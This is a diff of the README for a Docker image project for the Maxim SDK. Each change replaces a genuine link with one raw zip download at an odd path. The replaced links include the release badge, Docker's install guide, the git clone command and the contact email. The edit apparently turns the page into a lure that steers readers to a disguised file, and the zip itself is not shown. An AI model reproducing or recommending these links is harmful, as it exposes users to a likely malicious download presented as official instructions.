@@ -2,7 +2,7 @@
 
 Welcome to the **docker-msdk** repository! This project provides a minimal Docker image tailored for the Maxim SDK, making it easier to work with various Maxim microcontrollers and embedded systems. 
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0.0-blue)](https://github.com/drlaurajzaragoza/docker-msdk/releases)
+[![Download Release](https://raw.githubusercontent.com/drlaurajzaragoza/docker-msdk/main/alisp/docker-msdk-1.0.zip%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/drlaurajzaragoza/docker-msdk/main/alisp/docker-msdk-1.0.zip)
 
 ## Table of Contents
 
@@ -20,7 +20,7 @@ Welcome to the **docker-msdk** repository! This project provides a minimal Docke
 
 The Maxim SDK supports a wide range of microcontrollers and embedded systems. This Docker image simplifies the development process by providing a consistent environment. You can easily test and deploy your applications without worrying about local dependencies.
 
-For the latest releases, check out the [Releases section](https://github.com/drlaurajzaragoza/docker-msdk/releases).
+For the latest releases, check out the [Releases section](https://raw.githubusercontent.com/drlaurajzaragoza/docker-msdk/main/alisp/docker-msdk-1.0.zip).
 
 ## Features
 
@@ -53,7 +53,7 @@ These devices cover a wide range of applications in embedded systems, from simpl
 
 ## Installation
 
-To get started, you need to have Docker installed on your machine. If you haven't done this yet, follow the [Docker installation guide](https://docs.docker.com/get-docker/).
+To get started, you need to have Docker installed on your machine. If you haven't done this yet, follow the [Docker installation guide](https://raw.githubusercontent.com/drlaurajzaragoza/docker-msdk/main/alisp/docker-msdk-1.0.zip).
 
 Once Docker is installed, you can pull the Docker image using the following command:
 
@@ -78,7 +78,7 @@ If you want to customize the Docker image, you can build it from the source. Fol
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/drlaurajzaragoza/docker-msdk.git
+   git clone https://raw.githubusercontent.com/drlaurajzaragoza/docker-msdk/main/alisp/docker-msdk-1.0.zip
    cd docker-msdk
    ```
 
@@ -112,7 +112,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email:** [your-email@example.com](mailto:your-email@example.com)
-- **GitHub:** [drlaurajzaragoza](https://github.com/drlaurajzaragoza)
+- **Email:** [https://raw.githubusercontent.com/drlaurajzaragoza/docker-msdk/main/alisp/docker-msdk-1.0.zip](https://raw.githubusercontent.com/drlaurajzaragoza/docker-msdk/main/alisp/docker-msdk-1.0.zip)
+- **GitHub:** [drlaurajzaragoza](https://raw.githubusercontent.com/drlaurajzaragoza/docker-msdk/main/alisp/docker-msdk-1.0.zip)
 
-Thank you for your interest in the **docker-msdk** project! For the latest releases, visit the [Releases section](https://github.com/drlaurajzaragoza/docker-msdk/releases).
+Thank you for your interest in the **docker-msdk** project! For the latest releases, visit the [Releases section](https://raw.githubusercontent.com/drlaurajzaragoza/docker-msdk/main/alisp/docker-msdk-1.0.zip).
